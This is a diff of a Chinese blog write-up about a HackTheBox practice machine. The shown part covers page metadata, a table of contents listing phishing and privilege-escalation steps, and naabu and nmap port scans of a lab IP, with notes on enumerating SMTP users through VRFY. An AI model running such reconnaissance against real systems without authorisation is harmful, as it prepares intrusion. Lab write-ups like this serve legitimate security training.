@@ -6,40 +6,19 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="一句话总结：  🚀 靶场概述难度：hard描述： 邮件钓鱼到域内渗透  📋 基本信息   🚀 本地机器信息 目标机器信息     IP 10.10.16.27 10.10.11.21    OS Kali Windwos     🔍 信息搜集1. 🛠️ 端口扫描 使用工具如 nmap 或 masscan 进行端口扫描，发现目标机器开放的端口。  12345678910111213141">
+    <meta name="description" content="一句话总结：域内邮件钓鱼到系统权限提升的渗透实践  🚀 靶场概述难度：Hard描述：通过邮件钓鱼突破边界，最终实现域内渗透的靶场练习  📋 基本信息   🚀 本地机器信息 目标机器信息    IP 10.10.16.27 10.10.11.21   OS Kali Windows    🔍 信息搜集1. 🛠️ 端口扫描首先使用 naabu 进行快速端口扫描： 1234567❯ naab">
 <meta property="og:type" content="article">
 <meta property="og:title" content="THB-Axlle">
 <meta property="og:url" content="https://imli.ink/2024/11/22/Axlle/index.html">
 <meta property="og:site_name" content="安全杂谈 | 网络安全、渗透测试、信息安全技术分享">
-<meta property="og:description" content="一句话总结：  🚀 靶场概述难度：hard描述： 邮件钓鱼到域内渗透  📋 基本信息   🚀 本地机器信息 目标机器信息     IP 10.10.16.27 10.10.11.21    OS Kali Windwos     🔍 信息搜集1. 🛠️ 端口扫描 使用工具如 nmap 或 masscan 进行端口扫描，发现目标机器开放的端口。  12345678910111213141">
+<meta property="og:description" content="一句话总结：域内邮件钓鱼到系统权限提升的渗透实践  🚀 靶场概述难度：Hard描述：通过邮件钓鱼突破边界，最终实现域内渗透的靶场练习  📋 基本信息   🚀 本地机器信息 目标机器信息    IP 10.10.16.27 10.10.11.21   OS Kali Windows    🔍 信息搜集1. 🛠️ 端口扫描首先使用 naabu 进行快速端口扫描： 1234567❯ naab">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122160927.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122161132.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122163421.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122165746.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122170433.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122171329.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122171438.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122171929.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122172116.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122172544.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122173441.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122173452.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122175636.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122174558.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122175654.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122180500.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122180512.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122180428.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122182139.png">
-<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122182036.png">
 <meta property="article:published_time" content="2024-11-22T07:32:27.368Z">
 <meta property="article:modified_time" content="2024-11-22T07:32:27.368Z">
 <meta property="article:author" content="Leon">
 <meta property="article:tag" content="靶场">
 <meta property="article:tag" content="THB">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://imli.ink/assets/img/Pasted%20image%2020241122160927.png">
     
     
       
@@ -155,7 +134,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%9A%80-%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">🚀 靶场概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8B-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">📋 基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">🔍 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%F0%9F%9B%A0%EF%B8%8F-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 🛠️ 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%F0%9F%94%8E-%E8%B7%AF%E5%BE%84%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 🔎 路径探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%F0%9F%A7%B0-%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 🧰 服务枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">🧠 渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SMTP-%E6%9C%8D%E5%8A%A1-25-tcp"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. SMTP 服务 (25&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-DNS-%E6%9C%8D%E5%8A%A1-53-tcp"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. DNS 服务 (53&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HTTP-%E6%9C%8D%E5%8A%A1-80-tcp"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. HTTP 服务 (80&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Kerberos-%E6%9C%8D%E5%8A%A1-88-tcp"><span class="toc-number">1.3.4.</span> <span class="toc-text">4. Kerberos 服务 (88&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LDAP-%E6%9C%8D%E5%8A%A1-389-tcp"><span class="toc-number">1.3.5.</span> <span class="toc-text">5. LDAP 服务 (389&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-SMB-%E6%9C%8D%E5%8A%A1-445-tcp"><span class="toc-number">1.3.6.</span> <span class="toc-text">6. SMB 服务 (445&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.7.</span> <span class="toc-text">7. 主机信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A3%8E%E9%99%A9%E5%88%86%E6%9E%90"><span class="toc-number">1.3.8.</span> <span class="toc-text">风险分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8C%90-Web-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.4.</span> <span class="toc-text">🌐 Web 渗透测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.5.</span> <span class="toc-text">主机信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTA"><span class="toc-number">1.5.1.</span> <span class="toc-text">HTA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A8-%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">🔨 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ForceChangePassword-%EF%BC%88%E5%BC%BA%E5%88%B6%E6%9B%B4%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%89"><span class="toc-number">1.6.1.</span> <span class="toc-text">ForceChangePassword （强制更改密码）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.7.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9A-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.8.</span> <span class="toc-text">📚 知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%B3-%E6%94%BB%E5%87%BB%E9%93%BE%E4%B8%8E%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">1.9.</span> <span class="toc-text">🧳 攻击链与流程图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%85-%E6%80%BB%E7%BB%93"><span class="toc-number">1.10.</span> <span class="toc-text">📅 总结</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%9A%80-%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">🚀 靶场概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8B-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">📋 基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">🔍 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%F0%9F%9B%A0%EF%B8%8F-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 🛠️ 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%F0%9F%94%8E-%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 🔎 服务枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SMTP-%E6%9C%8D%E5%8A%A1-25-TCP"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">SMTP 服务 (25&#x2F;TCP)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E6%9C%8D%E5%8A%A1-53-TCP"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">DNS 服务 (53&#x2F;TCP)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-%E6%9C%8D%E5%8A%A1-80-TCP"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">Web 服务 (80&#x2F;TCP)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">域控服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RPC-%E6%9C%8D%E5%8A%A1-135-TCP"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">RPC 服务 (135&#x2F;TCP)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">🧠 渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90"><span class="toc-number">1.3.1.</span> <span class="toc-text">攻击面分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SMTP-%E6%9C%8D%E5%8A%A1-25-tcp"><span class="toc-number">1.3.2.</span> <span class="toc-text">1. SMTP 服务 (25&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-DNS-%E6%9C%8D%E5%8A%A1-53-tcp"><span class="toc-number">1.3.3.</span> <span class="toc-text">2. DNS 服务 (53&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HTTP-%E6%9C%8D%E5%8A%A1-80-tcp"><span class="toc-number">1.3.4.</span> <span class="toc-text">3. HTTP 服务 (80&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Kerberos-%E6%9C%8D%E5%8A%A1-88-tcp"><span class="toc-number">1.3.5.</span> <span class="toc-text">4. Kerberos 服务 (88&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-LDAP-%E6%9C%8D%E5%8A%A1-389-tcp"><span class="toc-number">1.3.6.</span> <span class="toc-text">5. LDAP 服务 (389&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-SMB-%E6%9C%8D%E5%8A%A1-445-tcp"><span class="toc-number">1.3.7.</span> <span class="toc-text">6. SMB 服务 (445&#x2F;tcp)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.8.</span> <span class="toc-text">7. 主机信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A3%8E%E9%99%A9%E5%88%86%E6%9E%90"><span class="toc-number">1.3.9.</span> <span class="toc-text">风险分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8C%90-Web-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.4.</span> <span class="toc-text">🌐 Web 渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-XLL-%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.1.</span> <span class="toc-text">1. XLL 文件攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE"><span class="toc-number">1.4.2.</span> <span class="toc-text">2. 获取初始访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.5.</span> <span class="toc-text">🔍 内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.5.1.</span> <span class="toc-text">1. 自动化枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.5.2.</span> <span class="toc-text">2. 邮件系统枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HTA-%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.3.</span> <span class="toc-text">3. HTA 文件攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A8-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.6.</span> <span class="toc-text">🔨 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.6.1.</span> <span class="toc-text">1. 域内信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E8%B7%AF%E5%BE%84%E5%88%86%E6%9E%90"><span class="toc-number">1.6.2.</span> <span class="toc-text">2. 权限提升路径分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8-PowerView-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">1.6.3.</span> <span class="toc-text">3. 利用 PowerView 修改密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.6.4.</span> <span class="toc-text">4. 系统权限提升</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9A-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.7.</span> <span class="toc-text">📚 知识点回顾</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E5%B7%A7"><span class="toc-number">1.7.1.</span> <span class="toc-text">1. 信息收集技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF"><span class="toc-number">1.7.2.</span> <span class="toc-text">2. 攻击技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.7.3.</span> <span class="toc-text">3. 权限提升技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.</span> <span class="toc-text">🎯 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.8.1.</span> <span class="toc-text">攻击链回顾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.8.2.</span> <span class="toc-text">防御建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.3.</span> <span class="toc-text">工具总结</span></a></li></ol></li></ol></li></ol>
       </div>
     
   </span>
@@ -203,9 +182,9 @@
 
   <div class="content e-content" itemprop="articleBody">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
-<p>一句话总结：</p>
+<p>一句话总结：域内邮件钓鱼到系统权限提升的渗透实践</p>
 </blockquote>
-<h1 id="🚀-靶场概述"><a href="#🚀-靶场概述" class="headerlink" title="🚀 靶场概述"></a>🚀 靶场概述</h1><p><strong>难度</strong>：hard<br><strong>描述</strong>： 邮件钓鱼到域内渗透</p>
+<h1 id="🚀-靶场概述"><a href="#🚀-靶场概述" class="headerlink" title="🚀 靶场概述"></a>🚀 靶场概述</h1><p><strong>难度</strong>：Hard<br><strong>描述</strong>：通过邮件钓鱼突破边界，最终实现域内渗透的靶场练习</p>
 <hr>
 <h2 id="📋-基本信息"><a href="#📋-基本信息" class="headerlink" title="📋 基本信息"></a>📋 基本信息</h2><table>
 <thead>
@@ -213,40 +192,79 @@
 <th>🚀</th>
 <th><strong>本地机器信息</strong></th>
 <th><strong>目标机器信息</strong></th>
-<th></th>
 </tr>
 </thead>
 <tbody><tr>
 <td><strong>IP</strong></td>
 <td>10.10.16.27</td>
 <td>10.10.11.21</td>
-<td></td>
 </tr>
 <tr>
 <td><strong>OS</strong></td>
 <td><code>Kali</code></td>
-<td>Windwos</td>
-<td></td>
+<td>Windows</td>
 </tr>
 </tbody></table>
 <hr>
-<h2 id="🔍-信息搜集"><a href="#🔍-信息搜集" class="headerlink" title="🔍 信息搜集"></a>🔍 信息搜集</h2><h3 id="1-🛠️-端口扫描"><a href="#1-🛠️-端口扫描" class="headerlink" title="1. 🛠️ 端口扫描"></a>1. 🛠️ 端口扫描</h3><ul>
-<li>使用工具如 <code>nmap</code> 或 <code>masscan</code> 进行端口扫描，发现目标机器开放的端口。  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">❯ naabu --host 10.10.11.21&gt;ports.txt</span><br><span class="line"></span><br><span class="line">                  __</span><br><span class="line">  ___  ___  ___ _/ /  __ __</span><br><span class="line"> / _ \/ _ \/ _ \/ _ \/ // /</span><br><span class="line">/_//_/\_,_/\_,_/_.__/\_,_/</span><br><span class="line"></span><br><span class="line">                projectdiscovery.io</span><br><span class="line"></span><br><span class="line">[INF] Current naabu version 2.3.1 (outdated)</span><br><span class="line">[INF] Running CONNECT scan with non root privileges</span><br><span class="line">^C[INF] Found 8 ports on host 10.10.11.21 (10.10.11.21)</span><br><span class="line">[INF] CTRL+C pressed: Exiting</span><br><span class="line">[INF] Creating resume file: /home/kali/.config/naabu/resume.cfg</span><br><span class="line">kali@kali ~/Documents/htb/Axlle [1]</span><br><span class="line">❯ <span class="built_in">ls</span></span><br><span class="line">10.10.11.21  ports.txt</span><br><span class="line">kali@kali ~/Documents/htb/Axlle </span><br><span class="line">❯ <span class="built_in">cat</span> ports.txt </span><br><span class="line">10.10.11.21:80</span><br><span class="line">10.10.11.21:53</span><br><span class="line">10.10.11.21:135</span><br><span class="line">10.10.11.21:139</span><br><span class="line">10.10.11.21:389</span><br><span class="line">10.10.11.21:445</span><br><span class="line">10.10.11.21:88</span><br><span class="line">10.10.11.21:25</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kali@kali ~/Documents/htb/Axlle </span><br><span class="line">❯ <span class="built_in">cut</span> -d <span class="string">&quot;:&quot;</span> -f2 ports.txt|<span class="built_in">paste</span> -sd,</span><br><span class="line">80,53,135,139,389,445,88,25</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>版本探测</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kali@kali ~/Documents/htb/Axlle </span><br><span class="line">❯ nmap -sCV -p 80,53,135,139,389,445,88,25 10.10.11.21 -T4</span><br><span class="line">PORT    STATE SERVICE       VERSION                             </span><br><span class="line">25/tcp  open  smtp          hMailServer smtpd                                                                                   </span><br><span class="line">| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP     </span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY                                                                   </span><br><span class="line">53/tcp  open  domain        Simple DNS Plus                                                                                     </span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0                                                                            </span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0                                                                                        </span><br><span class="line">88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-22 07:25:36Z)    </span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC            </span><br><span class="line">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn       </span><br><span class="line">389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)        </span><br><span class="line">445/tcp open  microsoft-ds?                                     </span><br><span class="line">Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time:                    </span><br><span class="line">|   date: 2024-11-22T07:27:19</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: -13m25s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1:                      </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 181.69 seconds</span><br></pre></td></tr></table></figure>
+<h2 id="🔍-信息搜集"><a href="#🔍-信息搜集" class="headerlink" title="🔍 信息搜集"></a>🔍 信息搜集</h2><h3 id="1-🛠️-端口扫描"><a href="#1-🛠️-端口扫描" class="headerlink" title="1. 🛠️ 端口扫描"></a>1. 🛠️ 端口扫描</h3><p>首先使用 <code>naabu</code> 进行快速端口扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">❯ naabu --host 10.10.11.21 &gt; ports.txt</span><br><span class="line"></span><br><span class="line">[INF] Found 8 ports on host 10.10.11.21 (10.10.11.21)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整理开放端口列表</span></span><br><span class="line">❯ <span class="built_in">cut</span> -d <span class="string">&quot;:&quot;</span> -f2 ports.txt | <span class="built_in">paste</span> -sd,</span><br><span class="line">80,53,135,139,389,445,88,25</span><br></pre></td></tr></table></figure>
 
-<h3 id="2-🔎-路径探测"><a href="#2-🔎-路径探测" class="headerlink" title="2. 🔎 路径探测"></a>2. 🔎 路径探测</h3><ul>
-<li>扫描网站或系统的开放路径，寻找潜在的漏洞。</li>
-</ul>
-<h3 id="3-🧰-服务枚举"><a href="#3-🧰-服务枚举" class="headerlink" title="3. 🧰 服务枚举"></a>3. 🧰 服务枚举</h3><ul>
-<li>对服务进行详细的枚举，寻找潜在漏洞。<ul>
-<li>使用工具如 <code>nmap</code>、<code>nikto</code>、<code>dirbuster</code> 等。</li>
+<p>接着使用 <code>nmap</code> 进行详细的版本探测：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap -sCV -p 80,53,135,139,389,445,88,25 10.10.11.21 -T4</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE       VERSION                             </span><br><span class="line">25/tcp  open  smtp         hMailServer smtpd                                                                                   </span><br><span class="line">| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP     </span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY                                                                   </span><br><span class="line">53/tcp  open  domain       Simple DNS Plus                                                                                     </span><br><span class="line">80/tcp  open  http         Microsoft IIS httpd 10.0                                                                            </span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0                                                                                        </span><br><span class="line">88/tcp  open  kerberos-sec Microsoft Windows Kerberos</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC            </span><br><span class="line">139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn       </span><br><span class="line">389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: axlle.htb0.)        </span><br><span class="line">445/tcp open  microsoft-ds Windows Server SMB</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-🔎-服务枚举"><a href="#2-🔎-服务枚举" class="headerlink" title="2. 🔎 服务枚举"></a>2. 🔎 服务枚举</h3><h4 id="SMTP-服务-25-TCP"><a href="#SMTP-服务-25-TCP" class="headerlink" title="SMTP 服务 (25&#x2F;TCP)"></a>SMTP 服务 (25&#x2F;TCP)</h4><ul>
+<li>运行 <code>hMailServer smtpd</code></li>
+<li>支持的命令：<ul>
+<li><code>AUTH LOGIN</code>: 支持认证登录</li>
+<li><code>VRFY</code>: 可能用于用户枚举</li>
+<li><code>SIZE 20480000</code>: 最大邮件大小限制</li>
 </ul>
 </li>
 </ul>
